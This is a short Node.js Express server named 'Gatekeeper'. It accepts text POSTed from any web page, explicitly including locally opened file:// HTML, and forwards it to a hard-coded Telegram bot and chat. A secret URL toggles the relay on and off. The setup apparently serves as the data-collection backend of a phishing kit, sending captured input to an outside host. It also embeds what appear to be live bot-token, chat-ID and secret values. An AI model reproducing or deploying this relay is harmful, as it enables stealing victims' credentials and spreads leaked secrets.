const express = require('express');
const app = express();

// === ENABLE CORS FOR ALL ORIGINS (including file://) ===
app.use((req, res, next) => {
  res.header('Access-Control-Allow-Origin', '*');
  res.header('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  next();
});
// =======================================================

app.use(express.json({ limit: '10mb' }));

// ==== CONFIG – CHANGE THESE ====
const BOT_TOKEN      = '7271652572:AAE9HwE9H1_24XXcOhh66hAyTpF6thvRQC0';          // get from @BotFather
const CHAT_ID        = '7088827085';
const TOGGLE_SECRET  = '2222a7c3ef921dd15a876bfa58292bfb'; // e.g. use https://generate-secret.now.sh/32
// ===============================

let loggingEnabled = true;

const TELEGRAM_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

// === 1. Receive log from HTML ===
app.post('/log', async (req, res) => {
  if (!loggingEnabled) {
    return res.json({ status: 'blocked' });
  }

  const { text } = req.body;
  if (!text) return res.status(400).json({ error: 'missing text' });

  try {
    const response = await fetch(TELEGRAM_URL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'HTML' })
    });

    if (!response.ok) {
      const err = await response.text();
      throw new Error(`Telegram error: ${err}`);
    }

    res.json({ status: 'sent' });
  } catch (e) {
    console.error('Telegram send failed:', e.message);
    res.json({ status: 'error', msg: e.message });
  }
});

// === 2. Toggle ON/OFF ===
app.get('/toggle/:secret', (req, res) => {
  if (req.params.secret !== TOGGLE_SECRET) {
    return res.status(403).send('Forbidden');
  }
  loggingEnabled = !loggingEnabled;
  res.send(`Logging <b>${loggingEnabled ? 'ENABLED' : 'DISABLED'}</b>`);
});

// === Optional: Health check ===
app.get('/', (req, res) => {
  res.send('Gatekeeper is running. Use POST /log to send data.');
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
  console.log(`Gatekeeper running on port ${PORT}`);
  console.log(`Toggle URL: /toggle/${TOGGLE_SECRET}`);
});




